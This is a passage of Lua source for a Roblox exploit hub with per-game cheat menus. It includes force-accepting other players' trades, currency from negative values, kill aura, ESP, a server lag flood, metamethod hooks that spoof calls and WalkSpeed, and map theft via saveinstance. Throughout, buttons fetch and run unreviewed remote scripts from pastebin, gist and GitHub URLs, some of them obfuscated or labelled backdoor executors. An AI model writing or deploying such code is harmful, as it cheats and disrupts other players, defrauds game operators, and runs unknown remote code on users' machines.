                game:GetService("ReplicatedStorage").Main.PetEquip:FireServer(game:GetService("ReplicatedStorage").Pets[chosenPet], game.Players.LocalPlayer.PlayerData.Pets:GetChildren()[1].Name, PetType)
            else
                print("You NEED a pet to spoof pets")
            end
            updatePetPicker()
        elseif string.sub(Actioner, 1, 1) == '4' then --Buy Any Egg
            game:GetService("ReplicatedStorage").Main.Buy:InvokeServer(chosenPet)
            updatePetPicker()
        elseif string.sub(Actioner, 1, 1) == '5' then --Megafy / Neonify
                if PetType == 'Neon' then
                    game:GetService("ReplicatedStorage").Main.NeonMaker.Main:InvokeServer("Convert", {(chosenPet):match(".*|([^|]+)$"), (chosenPet):match(".*|([^|]+)$"), (chosenPet):match(".*|([^|]+)$"), (chosenPet):match(".*|([^|]+)$")})
                elseif PetType == 'Mega' then
                    game:GetService("ReplicatedStorage").Main.MegaNeonMaker.Main:InvokeServer("Convert", {(chosenPet):match(".*|([^|]+)$"), (chosenPet):match(".*|([^|]+)$"), (chosenPet):match(".*|([^|]+)$"), (chosenPet):match(".*|([^|]+)$")})
                else
                    print("ERROR - MUST USE MEGA OR NEON")
                end
            updatePetPicker()
        elseif string.sub(Actioner, 1, 1) == '6' then --Force Trade
            game:GetService("ReplicatedStorage").GameEvents.Trades.Accept:FireServer(game:GetService("Players"):FindFirstChild(chosenPet))
            updatePetPicker()
        else
            print("ERROR - PET PICKER")
        end      
    end)

    PetEditorSection:NewButton("Refresh List", "does stuff", function()
        updatePetPicker()     
    end)
end

if game.PlaceId == 16810686252 or game.PlaceId == 13946745315 or game.PlaceId == 16810686490 then
    -- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

local selectedPlayer = "NOBODY❌"
local ESP

local GuesserList = {}
for _, model in ipairs(workspace:GetChildren()) do
    if model.Name:sub(1, 8) == "Phantom:" then
        local modelId = model.Name:sub(#"Phantom:" + 1)
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            if player and player.Name and player.Name ~= "" then
                local success, playerId = pcall(function()
                    return tostring(game:GetService("Players"):GetUserIdFromNameAsync(player.Name))
                end)
                if success and playerId == modelId then
                    table.insert(GuesserList, 1, player.Name)
                end
            end
        end
    end
end

    PlayerPicker = MainSection:NewDropdown("Select Player", "selects a player (Will Highlight Them)", { "NOBODY❌", unpack(GuesserList) }, function(SelectedUser)
        if ESP ~= null then
            ESP:Destroy()
        end

        selectedPlayer = SelectedUser

        ESP = Instance.new("Highlight")
        ESP.Name = SelectedUser
        ESP.FillTransparency = 0.5
        ESP.FillColor = Color3.new(1.000000, 0.000000, 0.000000)
        ESP.OutlineColor = Color3.new(1.000000, 1.000000, 1.000000)
        ESP.OutlineTransparency = 0
        for _, player in ipairs(game:GetService("Players"):GetChildren()) do
            if player.Name == SelectedUser then
                ESP.Parent = player.Character          
            end
        end
    end)

    MainSection:NewButton("pick player", "Picks a player (Picker Only)", function()
        game:GetService("Players"):FindFirstChild("#Network").RoundSystem.Pick:FireServer(game:GetService("Players"):GetUserIdFromNameAsync(selectedPlayer))
        if ESP ~= null then
            ESP:Destroy()
        end
    end)

    MainSection:NewButton("Update Lists", "Updates all lists", function()
        for _, model in ipairs(workspace:GetChildren()) do
            if model.Name:sub(1, 8) == "Phantom:" then
                local modelId = model.Name:sub(#"Phantom:" + 1)
                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                    if player and player.Name and player.Name ~= "" then
                        local success, playerId = pcall(function()
                            return tostring(game:GetService("Players"):GetUserIdFromNameAsync(player.Name))
                        end)
                        if success and playerId == modelId then
                            table.insert(GuesserList, 1, player.Name)
                        end
                    end
                end
            end
        end
        PlayerPicker:Refresh({ "NOBODY❌", unpack(GuesserList) })
    end)
end

if game.PlaceId == 9559194006 then
    -- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

local tempFogEnd
local tempGlobalShadows

local function showghosts(on)
    for i,v in pairs(game.CollectionService:GetTagged("Ghost")) do 
        if v.Name ~= game.Players.LocalPlayer.Name then
            v.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
            for i,p in pairs(v:GetDescendants()) do 
                if p:IsA("BasePart") or p:IsA("MeshPart") then
                    p.Color = Color3.fromRGB(166, 236, 255);
                    p.Material = Enum.Material.ForceField;
                    if on == true then
                        p.Transparency = p:GetAttribute("OriginalTrans") and 0
                    else
                        p.Transparency = 1
                    end
                end
            end
        end
    end
end

local Fullbright = false
local ViewGhosts = false


    FullbrightBTN = MainSection:NewButton("Lockdown FullBright (off)", "has to see actual wheel", function()
        if Fullbright == false then
            Fullbright = true
            FullbrightBTN:UpdateButton("Lockdown FullBright (on)")
            tempFogEnd = game:GetService("Lighting").FogEnd
            tempGlobalShadows = game:GetService("Lighting").GlobalShadows

            game:GetService("Lighting").FogEnd = 100000
            game:GetService("Lighting").GlobalShadows = false  
        else
            Fullbright = false
            FullbrightBTN:UpdateButton("Lockdown FullBright (off)")
            game:GetService("Lighting").FogEnd = tempFogEnd
            game:GetService("Lighting").GlobalShadows = tempGlobalShadows 
        end
    end)

    MainSection:NewButton("Give rose to all graves", "Takes a min", function()
        for _, grave in game:GetService("Workspace").Graves:GetChildren() do
            game:GetService("ReplicatedStorage").LeosRemotes.PlaceRose:FireServer(grave)
        end    
    end)

    GhostBTN = MainSection:NewButton("View Ghosts (off)", "cool", function()
        if ViewGhosts == false then
            GhostBTN:UpdateButton("View Ghosts (on)")
            showghosts(true)
            ViewGhosts = true
        else
            GhostBTN:UpdateButton("View Ghosts (off)")
            showghosts(false)
            ViewGhosts = false
        end
    end)
end

if game.PlaceId == 10228777202 then
    -- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

local tempFogEnd
local tempGlobalShadows

local ViewGhosts = false
local PredicorStatus = false

local function showghosts(on)
    for i,v in pairs(game.CollectionService:GetTagged("Ghost")) do 
        if v.Name ~= game.Players.LocalPlayer.Name then
            v.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
            for i,p in pairs(v:GetDescendants()) do 
                if p:IsA("BasePart") or p:IsA("MeshPart") then
                    p.Color = Color3.fromRGB(166, 236, 255);
                    p.Material = Enum.Material.ForceField;
                    if on == true then
                        p.Transparency = p:GetAttribute("OriginalTrans") and 0
                    else
                        p.Transparency = 1
                    end
                end
            end
        end
    end
end

PredictionLabel = MainSection:NewLabel("Predictor (Disabled)")

local targetConnection

function manageSpinnerPrediction(enabled)
    local closestPart
    local closestDistance

    local function checkDistance(part)
        if part then
            local distance = (part.Position - workspace.Chamber.Main.Position).magnitude
            if distance < closestDistance then
                closestDistance = distance
                closestPart = part
            end
        end
    end

    local function printPlayer(spinner)
        closestDistance = math.huge
        closestPart = nil
        for _, descendant in pairs(spinner:GetDescendants()) do
            if descendant.Name == "Board" then
                checkDistance(descendant)
            end
        end

        for _, descendant in pairs(workspace:GetDescendants()) do
            if descendant.Name == "Crate" and descendant:FindFirstChild("RootPart") then
                checkDistance(descendant.RootPart)
            end
        end

        if closestPart then
            if closestPart.Name == "Board" and closestPart.SurfaceGui.Frame.Username.Text ~= "" then
                PredictionLabel:UpdateLabel(closestPart.SurfaceGui.Frame.Username.Text)
            else
                PredictionLabel:UpdateLabel("Crate")
            end
        else
            PredictionLabel:UpdateLabel("Predictor Error")
        end
        game.Debris:AddItem(spinner, 90)
    end

    local function cloneSpinner()
        local model = workspace.Spinner:Clone()
        model.Parent = workspace
        model.Name = "Spinner1"
        model.Spots:Destroy()
        model.ToWeld:Destroy()
        for _, v in pairs(model:GetDescendants()) do
            pcall(function()
                if v:IsA("RopeConstraint") then 
                    v.Visible = false
                end
                if v.Transparency then 
                    v.Transparency = 1
                end
                if v.Visible then
                    v.Visible = false
                end
            end)
        end
        return model
    end

    if enabled then
        targetConnection = game.ReplicatedStorage.Remotes.Target.Changed:Connect(function()
            local SpinnerPart = cloneSpinner().PrimaryPart
            local Target = game.ReplicatedStorage.Remotes.Target.Value
            if Target == 0 then
                return
            end
            local Length = game.ReplicatedStorage.Remotes.Length.Value
            local OldCFrame = SpinnerPart.CFrame
            local finalRotation = (1 - 2.718281828459045 ^ (-6 * (Length / Length))) / 0.9975212478233336 * Target
            SpinnerPart.CFrame = OldCFrame * CFrame.Angles(0, math.rad(finalRotation), 0)
            wait(0.1)
            printPlayer(SpinnerPart.Parent)
        end)
    else
        if targetConnection then
            targetConnection:Disconnect()
            targetConnection = nil
        end
    end
end

local function manageGodmode(enabled)
    getgenv().godmode = enabled
end

game.ReplicatedStorage.Remotes.DeathEffect.OnClientEvent:Connect(function(p1, p2, p3)
    if p3 == game.Players.LocalPlayer.Character and getgenv().godmode == true then
        print("Godmode activated for protection.")
        local weld = p3:FindFirstChild("SpinnerWeld")
        local weld1 = weld:Clone()
        weld1.Parent = p3
        weld:Destroy()
        wait(10)
        weld1:Destroy()
    end
end)



    PredictorBTN = MainSection:NewButton("Predicor (off)", "cool", function()
        if PredicorStatus == false then
            PredictorBTN:UpdateButton("Predicor (on)")
            manageSpinnerPrediction(true)
            PredictionLabel:UpdateLabel("Predictor (Enabled)")
            PredicorStatus = true
        else
            PredictorBTN:UpdateButton("Predicor (off)")
            manageSpinnerPrediction(false)
            PredictionLabel:UpdateLabel("Predictor (Disabled)")
            PredicorStatus = false
        end
    end)

    GhostBTN = MainSection:NewButton("View Ghosts (off)", "cool", function()
        if ViewGhosts == false then
            GhostBTN:UpdateButton("View Ghosts (on)")
            showghosts(true)
            ViewGhosts = true
        else
            GhostBTN:UpdateButton("View Ghosts (off)")
            showghosts(false)
            ViewGhosts = false
        end
    end)

    
    GodmodeBTN = MainSection:NewButton("Godemode (off)", "cool", function()
        if Godmode == false then
            GodmodeBTN:UpdateButton("Godemode (on)")
            manageGodmode(true)
            Godmode = true
        else
            GodmodeBTN:UpdateButton("Godemode (off)")
            manageGodmode(false)
            Godmode = false
        end
    end)
end

if game.PlaceId == 17770934191 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Get Aura", "Get Aura", function(AuraCount)
        local args = {
            [1] = "Basic Egg",
            [2] = -1/75*AuraCount
        }
        game:GetService("ReplicatedStorage").Remotes.Egg:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 9049840490 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Ring Farm", "Farms Rings", function()
        RingAutoFarm = true
        while RingAutoFarm == true do
            for _, child in ipairs(game:GetService("Workspace"):FindFirstChild("World Currencies"):GetChildren()) do
                local childName = child.Name
                game:GetService("ReplicatedStorage").Knit.Services.WorldCurrencyService.RE.PickupCurrency:FireServer(childName)
                wait(SmallTick)
            end
            wait(5)
        end       
    end)

    MainSection:NewButton("Stop Ring Farm", "Stops Farming Rings", function()
        RingAutoFarm = false      
    end)
end

if game.PlaceId == 124078291867377 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
SkinQuantity = 1

local AllCharacters = {}

for _, v in pairs(game:GetService("ReplicatedStorage").Characters:GetChildren()) do
    AllCharacters.insert(1,v.Name)
end 

    MainSection:NewButton("Find all Hiders", "yes", function()     
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            if player:FindFirstChild("PlayerData") and 
               player.PlayerData:FindFirstChild("MatchData") and 
               player.PlayerData.MatchData:FindFirstChild("Seeker") and 
               not player.PlayerData.MatchData.Seeker.Value then
                game:GetService("ReplicatedStorage").Remotes.Events.FoundHider:FireServer(player.Name)
                wait(SmallTick)
            end
        end              
    end)

    MainSection:NewTextBox("Skin Quantity", "woow", function(superSkinQuantity)
        SkinQuantity = superSkinQuantity
    end)             

    MainSection:NewDropdown("Add Skin (U LOSE MONEY!)", "yes" , AllCharacters ,  function(CharSelected)    
    game:GetService("ReplicatedStorage").Remotes.Events.SellCharacters:FireServer(CharSelected, SkinQuantity)             
    end)
end

if game.PlaceId == 13157638696 then
    -- MAIN
    RefreshPlayerList()
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    sprintSpeed = 35
    InfSprint = false
    killAura = false

    MainSection:NewSlider("Sprint Speed", "holy moly", 130, 35, function(s)
        sprintSpeed = s
        if InfSprint then
            game:GetService("ReplicatedStorage").RemoteEvents.SprintEvent:FireServer(true, sprintSpeed)
        else
            game:GetService("ReplicatedStorage").RemoteEvents.SprintEvent:FireServer(false, 25)
        end
    end)
    
    MainSection:NewToggle("Sprint", "woow cool", function(state)
        if state then
            game:GetService("ReplicatedStorage").RemoteEvents.SprintEvent:FireServer(true, sprintSpeed)
            InfSprint = true
        else
            game:GetService("ReplicatedStorage").RemoteEvents.SprintEvent:FireServer(false, 25)
            InfSprint = false
        end
    end)

    MainSection:NewToggle("Kill Aura", "", function(state)
        if state then
            killAura = true
            while killAura do
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    pcall(function()
                        if game:GetService("Workspace"):FindFirstChild(player.Name).Prop then
                            for i = 1, 3 do
                                game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Framework"):WaitForChild("RemoteManger"):WaitForChild("SendData"):FireServer("MeleeServer", player)
                                wait(Tick)
                            end
                        end
                    end)
                wait(Tick)
                end
                wait(Tick)
            end
        else
            killAura = false
        end
    end)
end

if game.PlaceId == 96462622512177 then
    -- MAIN
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    LagServer = false
    Autofarm = false
    LocalPlace = 0

    --Get Place Location
    for _, place in pairs(game:GetService("Workspace").Places:GetChildren()) do
        if place.PlayerInfo.SurfaceGui.PlayerName.Text == game:GetService("Players").LocalPlayer.Name then
            LocalPlace = place.Name
        end
    end 

    LagserverBTN = MainSection:NewButton("LAG (dw has clientsided antilag) [OFF]", "", function()
        if LagServer then
            LagserverBTN:UpdateButton("LAG (dw has clientsided antilag) [OFF]")
            LagServer = false

            --antilag
            for _, place in pairs(game:GetService("Workspace").Places:GetChildren()) do
                if place.PlayerInfo.SurfaceGui.PlayerName.Text ~= "" then
                    place.Machine.CashierDesk.MoneyPlacePart.Money:ClearAllChildren()
                end
            end  
        else
            LagserverBTN:UpdateButton("LAG (dw has clientsided antilag) [ON]")
            LagServer = true
            while LagServer do
                game:GetService("ReplicatedStorage").Events.Payment.OperatePaymentRE:FireServer(5, "PutCash")
                wait(SmallTick)

                --antilag
                for _, place in pairs(game:GetService("Workspace").Places:GetChildren()) do
                    if place.PlayerInfo.SurfaceGui.PlayerName.Text ~= "" then
                        place.Machine.CashierDesk.MoneyPlacePart.Money:ClearAllChildren()
                    end
                end  
            end
        end
    end)

    MainSection:NewButton("Clear lag globally", "", function()
        --antilag (Client)
        for _, place in pairs(game:GetService("Workspace").Places:GetChildren()) do
            if place.PlayerInfo.SurfaceGui.PlayerName.Text ~= "" then
                place.Machine.CashierDesk.MoneyPlacePart.Money:ClearAllChildren()
            end
        end 

        --Clears your money
        game:GetService("ReplicatedStorage").Events.Payment.ChangeCashierStatusRE:FireServer("ChangeCashierStatus", false)
    end)

    AutofarmBTN = MainSection:NewButton("Autofarm [OFF]", "", function()
        if Autofarm then
            AutofarmBTN:UpdateButton("Autofarm [OFF]")
            Autofarm = false
            game:GetService("ReplicatedStorage").Events.Payment.ChangeCashierStatusRE:FireServer("ChangeCashierStatus", false)
        else
            AutofarmBTN:UpdateButton("Autofarm [ON]")
            Autofarm = true 
            game:GetService("ReplicatedStorage").Events.Payment.ChangeCashierStatusRE:FireServer("ChangeCashierStatus", true)
            while Autofarm do
                if #game:GetService("Workspace").Places:FindFirstChild(LocalPlace).Machine.CashierDesk.ActionCustomer:GetChildren() > 0 then
                    for _, item in pairs(game:GetService("Workspace").Places:FindFirstChild(LocalPlace).Machine.CashierDesk.ProductFolder:GetChildren()) do
                        fireclickdetector(item.PP.GoodsClickDetector)
                    end 
                    string.sub(game:GetService("Workspace").Places:FindFirstChild(LocalPlace).Machine.CashierDesk.Computer.ComputerScreen.ComputerSurfaceGui.ComputerFrame.GoodsInputFrame.TotalAmount.Text, 2)
                    game:GetService("ReplicatedStorage").Events.Payment.PaymentFinishRE:FireServer("PaidFinish", 20)
                    wait(1.5)
                end
                wait(BigTick)
            end
        end
    end)
end

if game.PlaceId == 7606602544 then
    -- MAIN
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")
    HoneycombGodmode = false
    AntiFallFromGlass = false
    GlassGodmodeBeenSetup = false

    --Honeycomb Godmode
    local oldHoneycombRequests
    oldHoneycombRequests = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if HoneycombGodmode and method == "FireServer" then
            if self == game:GetService("ReplicatedStorage").Remotes.Events.EffectsEvent then
                if args[2] == false then
                    self:FireServer("Success", true)
                    return
                end
            end
        end

        return oldHoneycombRequests(self, ...)
    end)
    

    function GlassGodmodeSetup ()
        GlassGodmodeBeenSetup = true
        for _, model in ipairs(game:GetService("Workspace").SteppingStones.Tiles:GetChildren()) do
            if model:IsA("Model") then
                for _, mesh in ipairs(model:GetChildren()) do
                    if mesh:IsA("MeshPart") then
                        local newPart = Instance.new("Part")
                        newPart.Size = mesh.Size
                        newPart.CFrame = mesh.CFrame
                        newPart.Anchored = true
                        newPart.CanCollide = false
                        newPart.Transparency = 1
                        newPart.Parent = model
                    end
                end
            end
        end
    end

    HoneycombGodmodeBTN = MainSection:NewButton("Honeycomb Godmode [OFF]", "if you die on honeycomb you can sill live", function()
        if HoneycombGodmode then
            HoneycombGodmodeBTN:UpdateButton("Honeycomb Godmode [OFF]")
            HoneycombGodmode = false
        else
            HoneycombGodmodeBTN:UpdateButton("Honeycomb Godmode [ON]")
            HoneycombGodmode = true 
        end
    end)

    AntiFallFromGlassBTN = MainSection:NewButton("Anti Fall From Glass [OFF]", "", function()
        if game:GetService("Workspace").SteppingStones.Tiles then
            if GlassGodmodeBeenSetup then
                if AntiFallFromGlass then
                    AntiFallFromGlass = false
                    AntiFallFromGlassBTN:UpdateButton("Anti Fall From Glass [OFF]")
                    for _, model in ipairs(game:GetService("Workspace").SteppingStones.Tiles:GetChildren()) do
                        if model:IsA("Model") then
                            for _, part in ipairs(model:GetChildren()) do
                                part.CanCollide = false
                            end
                        end
                    end
                else
                    AntiFallFromGlass = true
                    AntiFallFromGlassBTN:UpdateButton("Anti Fall From Glass [ON]")
                    for _, model in ipairs(game:GetService("Workspace").SteppingStones.Tiles:GetChildren()) do
                        if model:IsA("Model") then
                            for _, part in ipairs(model:GetChildren()) do
                                part.CanCollide = true
                            end
                        end
                    end
                end
            else
                GlassGodmodeSetup()
            end
        else
            MainSection:UpdateSection("ERR: Glassbridge NOT defined")
        end
    end)
end

if game.PlaceId == 8200787440 then
    -- MAIN
    local Main = Window:NewTab("Main")
    local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Claim Present", "", function()
        game:GetService("ReplicatedStorage").Packages._Index["sleitnick_knit@1.5.1"].knit.Services.GiftService.RF.GetPresent:InvokeServer("Present")
    end)

    MainSection:NewButton("Claim Super Present", "", function()
        game:GetService("ReplicatedStorage").Packages._Index["sleitnick_knit@1.5.1"].knit.Services.GiftService.RF.GetPresent:InvokeServer("SuperPresent")
    end)

    MainSection:NewTextBox("Get Skulls", "", function(Skulls)
        game:GetService("ReplicatedStorage").Events.BuySkin:FireServer("emoji", (0 - toInt(Skulls)))
    end)
end

-- All Games

local All = Window:NewTab("All")
local AllSection = All:NewSection("All Games")

    AllSection:NewButton("BackDoor Executor LOLAL", "Password    Free Scripts", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
    end)

    AllSection:NewButton("Full Bright", "Vry OP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/FullBright.lua"))()
    end)

    AllSection:NewButton("BadgeWalk Hack", "Vry OP", function()
        for _,v in pairs(workspace:GetDescendants()) do
            if v:IsA("TouchTransmitter") then
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
                task.wait()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
            end
        end
    end)

    AllSection:NewButton("Reset Character", "Vry OP", function()
        game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
    end)

    AllSection:NewButton("GodMode", "Vry OP", function()
        GodModes = true
        while GodModes == true do 
            game:GetService("Players").LocalPlayer.Character.Humanoid.Health = (5/0)
            wait(0.00001)
        end
    end)

    AllSection:NewButton("UnGodMode", "Vry OP", function()
        GodModes = false
    end)

    AllSection:NewButton("FlingAll", "Vry OP", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
    end)

    AllSection:NewButton("OP Flinger", "Vry OP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/OPFlinger.lua",true))() 
    end)

    AllSection:NewButton("flinger", "Vry OP", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
    end)

    AllSection:NewButton("Anti Kick", "Vry OP", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
    end)

    AllSection:NewButton("Copy Console", "Console has to be open", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/console.lua",true))() 
    end)

    AllSection:NewButton("Sword Reach", "mostly patched", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/Reech.lua",true))()
    end)

    AllSection:NewButton("Nullware", "More Animations and Audio", function()
        getgenv().Theme = "Purple"
        loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/2d722888a388017c18028cd434c43a25/raw/dcccf1027fe4b90780e47767aaf584389c9d7771/EULma3fU90PUOKUn?identifier=".. (function()local a=""for b=1,256 do local c=math.random(1,3)a=a..string.char(c==1 and math.random(48,57)or c==2 and math.random(97,122)or c==3 and math.random(65,90))end;return a end)()))() 
    end)

    AllSection:NewButton("Infinite Yeild", "hi", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
    end)

    AllSection:NewButton("dupe", "dupe takes a bit", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/dupe1.lua",true))()
    end)

    AllSection:NewButton("Chat Bypass GUI", "Very OP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/Bypass/main/vadrifts.lua"))()
    end)

    AllSection:NewTextBox("Speed", "Press Enter After Value", function(sped)
        local walkSpeed = sped
        local gmt = getrawmetatable(game)
        setreadonly(gmt, false)
        local oldindex = gmt.__index
        gmt.__index = newcclosure(function(self,b)
        if b == "WalkSpeed" then
        return 16
        end
        return oldindex(self,b)
        end)
        game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeed
    end)

    AllSection:NewTextBox("Jump", "Press Enter After Value", function(jrump)
        local Power = jrump
        setscriptable(game:GetService("Players").LocalPlayer.Character.Humanoid,"JumpPower",true)
        sethiddenproperty(game:GetService("Players").LocalPlayer.Character.Humanoid,"JumpPower",Power)
    end)

    AllSection:NewButton("Pet Hack For Sims", "Pet Hack That Works on Some Simulators", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/PetHack.lua",true))()
    end)

    AllSection:NewButton("Click TP - Press t", "Click Tp, Press t To Toggle", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/ClickTp.lua",true))()
    end)

    AllSection:NewButton("Steal Game", "Steals Some Scripts And The Map", function()
        saveinstance()
    end)

    AllSection:NewButton("BackDoor Executor", "Password    Free Scripts", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/BackdoorEXE.lua",true))()
    end)

    AllSection:NewButton("Roblox Animations", "lets you use animations from roblox", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/AnimationEditGUI.lua",true))()
    end)

    AllSection:NewButton("Universe Viewer", "lets you join any place in that game", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/UniverseViewer.lua",true))()
    end)

    AllSection:NewButton("Copy Game/Place ID", "Copys the Game/Place ID to ClipBoard", function()
        setclipboard(game.PlaceId)
        toclipboard(game.PlaceId)
    end)

    AllSection:NewButton("GodMode", "Works in only some games", function()
        game.Players.LocalPlayer.Character.Humanoid.Name = 1
        local l = game.Players.LocalPlayer.Character["1"]:Clone()
        l.Parent = game.Players.LocalPlayer.Character
        l.Name = "Humanoid"
        wait(0.1)
        game.Players.LocalPlayer.Character["1"]:Destroy()
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Character.Animate.Disabled = true
        wait(0.1)
        game.Players.LocalPlayer.Character.Animate.Disabled = false
        game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
    end)

    AllSection:NewDropdown("Sploof Device", "Works in only some games", {"Mobile", "Gamepad", "Keyboard"}, function(Device)
        local old
local DeviceToSpoof = Device

old = hookmetamethod(game,"__namecall",function(self,...)
   local args = {...}
   local method = getnamecallmethod()
   if method == "FireServer" then
       if tostring(self) == "deviceEvent" then
           args[1] = DeviceToSpoof
           return self.FireServer(self,unpack(args))
       end
   end
   return old(self,...)
end)
    end)

    -- Hubs

local Hubsa = Window:NewTab("Hubs")
local HubSection = Hubsa:NewSection("Hubs")

    HubSection:NewButton("Raven Hub", "Roblox Hub", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/RavenHub.lua"))()
    end)

    HubSection:NewButton("Owl Hub", "Roblox Hub", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
    end)

    HubSection:NewButton("Cone Hub", "Roblox Hub", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/nonfunctable/Cone-Hub/main/Kavo-UI-Libary.lua", true))()
    end)

    HubSection:NewButton("Darth Hub", "Roblox Hub", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sjonks/DarthHub/main/Scripts/DarthHub.lua"))()
    end)

    HubSection:NewButton("Extreme Antonis Hub", "Roblox Hub", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/KeySystemUI-Obfuscated.lua"))()
    end)

    HubSection:NewButton("GodXNation Hub - see edits", "Roblox Hub - key is godxnation", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GodXNation/GodXNation/main/midnight%20racing%20hubV2%20fixed", true))()
    end)

    HubSection:NewButton("Saza Hub", "Roblox Hub", function()
        _G.Color = Color3.fromRGB(255, 255, 255)
        loadstring(game:HttpGet"https://rawscripts.net/raw/SAZA-HUB_496")()
    end)

    HubSection:NewButton("VG Hub", "Roblox Hub", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
    end)

    -- Dev Tools 

local DTools = Window:NewTab("Dev Tools")
local DevToolsSection = DTools:NewSection("Dev Tools")

        DevToolsSection:NewButton("PID: ".. tostring(game.PlaceId), "Shows place ID", function()
            print(game.PlaceId)
            setclipboard(tostring(game.PlaceId))
        end)

        DevToolsSection:NewButton("GID: "..  tostring(game.GameId), "Shows game ID", function()
            print(game.GameId)
            setclipboard(tostring(game.GameId))
        end)
        
        DevToolsSection:NewButton("Simple Spy", "remote event spy", function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/refs/heads/master/SimpleSpy.lua"))()
        end)
    
        DevToolsSection:NewButton("Hydroxide", "remote event spy", function()
            local owner = "Upbolt"
            local branch = "revision"

            local function webImport(file)
                return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
            end

            webImport("init")
            webImport("ui/main")
        end)

                
        DevToolsSection:NewButton("Dark Dex", "hack", function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/refs/heads/main/Dark%20Dex/V2-Synapse-Edition-Working.lua", true))()
        end)
    
